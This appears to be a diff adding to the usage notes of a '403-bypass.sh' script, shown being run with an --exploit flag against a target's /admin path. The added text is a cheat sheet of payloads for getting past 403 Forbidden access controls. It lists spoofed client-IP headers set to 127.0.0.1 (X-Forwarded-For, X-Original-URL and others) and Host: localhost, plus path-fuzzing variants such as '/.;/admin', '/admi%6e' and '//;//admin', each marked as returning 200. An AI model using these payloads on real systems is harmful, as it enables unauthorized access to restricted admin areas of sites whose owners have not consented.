@@ -6,3 +6,50 @@ chmod +x 403-bypass.sh
 
 Execution: bash 403-bypass.sh -u "https://target.com/admin" --exploit
 
+
+
+                                                                                 
+                                                                                           Change Host header
+
+
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Host: localhost
+
+
+
+                                                                                              Path Fuzzing
+
+
+site.com/secret/ –> HTTP 200 OK
+site.com/secret/. –> HTTP 200 OK
+site.com//secret// –> HTTP 200 OK
+site.com/./secret/.. –> HTTP 200 OK
+site.com/;/secret –> HTTP 200 OK
+site.com/.;/secret –> HTTP 200 OK
+site.com//;//secret –> HTTP 200 OK
+
+· /Admin -> 200
+· /AdMin -> 200
+· /admin/ -> 200
+· /admin/. -> 200
+· //admin// -> 200
+· /.;/admin -> 200
+· /./admin/.. -> 200
+· /admin.json -> 200
+· /;/admin -> 200
+· //;//admin -> 200
+· /admi%6e -> 200
+· /%2e/admin -> 200
+· /admin..;/ -> 200
+
